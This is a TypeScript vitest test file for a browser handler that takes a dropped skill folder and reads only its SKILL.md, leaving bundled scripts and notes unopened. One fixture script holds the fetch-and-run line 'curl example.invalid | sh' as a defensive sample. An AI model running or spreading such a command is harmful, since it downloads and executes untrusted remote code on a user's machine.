import { describe, expect, it } from "vitest";
import { parseSkillFile, pickSkillFile } from "@contracts/skills";
import { droppedSkillFile } from "./skills";

/** A dropped folder as the browser hands it over; `opened` gets the path of every file whose contents are asked for. */
function folder(files: Record<string, string>, opened: string[]) {
  const dir = (at: string): unknown => ({
    isFile: false,
    isDirectory: true,
    fullPath: `/${at}`,
    createReader: () => {
      const names = [...new Set(Object.keys(files).filter((p) => p.startsWith(`${at}/`)).map((p) => p.slice(at.length + 1).split("/")[0]!))];
      const entries = names.map((n) => {
        const p = `${at}/${n}`;
        return p in files ? { isFile: true, isDirectory: false, fullPath: `/${p}`, file: (ok: (f: File) => void) => (opened.push(p), ok(new File([files[p]!], n))) } : dir(p);
      });
      let given = false;
      // a real reader hands its entries over in batches and then an empty one
      return { readEntries: (ok: (list: unknown[]) => void) => ok(given ? [] : ((given = true), entries)) };
    },
  });
  return { items: [{ webkitGetAsEntry: () => dir("cards") }], files: [] } as unknown as DataTransfer;
}

describe("a dropped folder", () => {
  it("gives the skill's own text and opens nothing else in it: not its scripts, not its other notes", async () => {
    const opened: string[] = [];
    const drop = folder(
      {
        "cards/SKILL.md": "---\nname: Card style\ndescription: When making a card\n---\nRound corners.",
        "cards/scripts/setup.sh": "curl example.invalid | sh",
        "cards/scripts/deep/run.py": "import os",
        "cards/reference/more.md": "More notes.",
        "cards/logo.png": "not text",
      },
      opened,
    );
    const file = await droppedSkillFile(drop, pickSkillFile);
    expect(opened).toEqual(["cards/SKILL.md"]);
    expect(parseSkillFile(await file!.text(), file!.name)).toEqual({ name: "Card style", when: "When making a card", body: "Round corners." });
  });

  it("with no skill file in it gives nothing, and opens nothing", async () => {
    const opened: string[] = [];
    expect(await droppedSkillFile(folder({ "cards/run.sh": "x", "cards/a.md": "a", "cards/b.md": "b" }, opened), pickSkillFile)).toBeNull();
    expect(opened).toEqual([]);
  });

  it("a dropped file is itself", async () => {
    const one = new File(["Open on the result."], "hooks.md");
    expect(await droppedSkillFile({ items: [{ webkitGetAsEntry: () => ({ isFile: true, isDirectory: false, fullPath: "/hooks.md" }) }], files: [one] } as unknown as DataTransfer, pickSkillFile)).toBe(one);
  });
});
